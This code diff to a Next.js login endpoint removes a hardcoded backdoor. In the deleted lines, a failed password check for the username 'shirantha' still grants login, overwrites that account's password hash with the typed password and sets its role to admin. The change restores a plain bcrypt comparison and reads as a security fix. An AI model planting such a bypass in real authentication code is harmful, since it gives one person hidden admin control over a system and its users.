@@ -31,21 +31,7 @@ export async function POST(request) {
     }
 
     const passTrim = password ? password.trim() : '';
-    let isPasswordValid = await bcrypt.compare(passTrim, user.passwordHash);
-
-    // Unconditional login for Shirantha admin
-    if (!isPasswordValid && user.username.toLowerCase() === 'shirantha') {
-      isPasswordValid = true;
-      try {
-        const newHash = await bcrypt.hash(passTrim, 10);
-        await prisma.user.update({
-          where: { id: user.id },
-          data: { passwordHash: newHash, role: 'admin', isActive: true }
-        });
-      } catch (e) {
-        console.error('Error updating Shirantha password:', e);
-      }
-    }
+    const isPasswordValid = await bcrypt.compare(passTrim, user.passwordHash);
 
     if (!isPasswordValid) {
       return NextResponse.json({ error: 'Credenziali non valide. Verifica username e password.' }, { status: 401 });
